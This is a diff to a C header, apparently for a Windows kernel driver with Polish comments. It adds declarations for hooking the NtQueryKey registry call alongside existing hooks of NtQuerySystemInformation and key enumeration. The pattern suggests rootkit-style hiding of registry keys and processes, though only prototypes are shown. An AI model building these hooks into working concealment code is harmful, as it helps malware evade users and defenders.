@@ -82,6 +82,14 @@ typedef NTSTATUS (*ZWOPENKEY)(
 	IN POBJECT_ATTRIBUTES 
 );
 
+typedef NTSTATUS (*ZWQUERYKEY)( 								  
+	IN HANDLE, 
+	IN KEY_INFORMATION_CLASS,
+    OUT PVOID, 
+	IN ULONG, 
+	OUT PULONG 
+);
+
 //---------------------------------------------------------------------------------
 // STRUKTURY
 //---------------------------------------------------------------------------------
@@ -192,6 +200,10 @@ typedef struct _DirEntry {
   WCHAR suName[ 1 ];
 } DirEntry, *PDirEntry;
 
+//
+// Key query structures
+//
+
 //---------------------------------------------------------------------------------
 // MAKRA
 //---------------------------------------------------------------------------------
@@ -278,6 +290,15 @@ HookNtQuerySystemInformation(
     OUT PULONG ReturnLength OPTIONAL
     );
     
+
+NTSTATUS HookNtQueryKey(
+	HANDLE hKey,
+	KEY_INFORMATION_CLASS KeyInfoClass,
+	PVOID KeyInfoBuffer,
+	ULONG KeyInfoBufferLength,
+	PULONG Byte
+);
+    
 VOID HookApis();                                   
 VOID UnHookApis();                             
 VOID SetupIndexes();                           
@@ -327,5 +348,15 @@ ZwEnumerateKey(
 	OUT PULONG BytesCopied
 );
 
+NTSYSAPI
+NTSTATUS
+NTAPI
+ZwQueryKey(
+	IN HANDLE hKey,
+	IN KEY_INFORMATION_CLASS KeyInfoClass,
+	OUT PVOID KeyInfoBuffer,
+	IN ULONG KeyInfoBufferLength,
+	OUT PULONG BytesCopied
+);
 
 #endif
